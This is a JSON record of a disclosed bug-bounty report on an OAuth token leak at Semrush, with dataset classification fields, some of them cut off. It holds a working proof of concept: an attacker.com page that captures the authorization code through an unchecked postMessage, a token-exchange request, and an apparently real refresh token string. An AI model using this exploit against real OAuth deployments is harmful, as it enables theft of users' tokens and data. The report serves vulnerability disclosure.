{
  "reported_to": "Semrush",
  "reported_by": "nikitastupin ",
  "title": "[oauth token leak] at oauth.semrush.com",
  "content": "\nDomain, site, application\noauth.semrush.com\nSteps to reproduce\n1) Create following html at attacker.com/postmessage.html\nCode 404 Bytes\n1<script>\n2  function listener(event) {\n3    alert(JSON.stringify(event.data));\n4  }\n5\n6  var dest = window.open(\"https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962\");\n7  \n8  window.addEventListener(\"message\", listener);\n9</script>\n2) Go to attacker.com/postmessage.html (make sure you are logged in at www.semrush.com)\n3) Click \"Approve\"\n4) Go to tab with attacker.com, you will see alert with code\n5) Make POST request with obtained code\nCode 512 Bytes\n1POST /oauth2/access_token HTTP/1.1\n2Host: oauth.semrush.com\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\n4Accept: */*\n5Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7Content-type: application/x-www-form-urlencoded\n8Content-Length: 205\n9DNT: 1\n10Connection: close\n11\n12client_id=seoquake&client_secret=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&grant_type=authorization_code&code=[COPY OBTAINED CODE HERE]&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess\n6) Receive response with access token and refresh token\nCode 363 Bytes\n1HTTP/1.1 200 OK\n2Server: nginx\n3Content-Type: application/json\n4Connection: close\n5Cache-Control: no-cache\n6Date: Sat, 10 Feb 2018 19:06:38 GMT\n7Set-Cookie: session=\u2588\u2588\u2588\u2588; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly\n8\n9{\"access_token\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"token_type\":\"Bearer\",\"expires_in\":604800,\"refresh_token\":\"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC\"}\nActual results\naccess token and refresh token of victim:\nCode 130 Bytes\n1{\"access_token\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"token_type\":\"Bearer\",\"expires_in\":604800,\"refresh_token\":\"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC\"}\nPoC, exploit code, screenshots, video, references, additional resources\nThis vulnerability is possible due to lack of window.opener origin check at https://oauth.semrush.com/oauth2/success:\nCode 169 Bytes\n1<script>\n2\tif (window.opener && typeof opener.postMessage === 'function') {\n3\t\topener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*');\n4\t}\n5</script>\nMeaning any site that opens https://oauth.semrush.com/oauth2/success may read code in location.href.\nAttack vector based on fact that user sees SEOquake authorization page approve.png (F262215) thinking that it's just official application permission request and with high probability clicks \"Approve\".\nStill working at vector without this small user interaction.\nImpact\nOAuth tokens leakage. This leads to user sensitive information leakage.\nNote: it's not necessary to install SEOquake plugin!\nP.S.\nI'm aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.\nI've reported vulnerability as soon as possible therefore no time to deeper scope research.\n\n",
  "severity": "[",
  "bounty": 150,
  "weaknesses": "[",
  "screenshots": {},
  "disclosed_date": 1523980680,
  "report_url": "https://hackerone.com/reports/314814",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": "[",
  "vuln_description": "The vulnerability is an OAuth token leak at oauth.semrush.com due to a lack of origin check in the window.opener postMessage handler. This allows an attacker to steal OAuth tokens by tricking a user into approving a malicious OAuth request, leading to potential sensitive information leakage.",
  "reason": "The attack involves understanding OAuth flow, crafting a malicious HTML page, and exploiting the postMessage handler without proper origin checks. While the components are standard, the interaction between them is subtle and requires knowledge of OAuth and postMessage vulnerabilities.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "injection_classification": "}"
}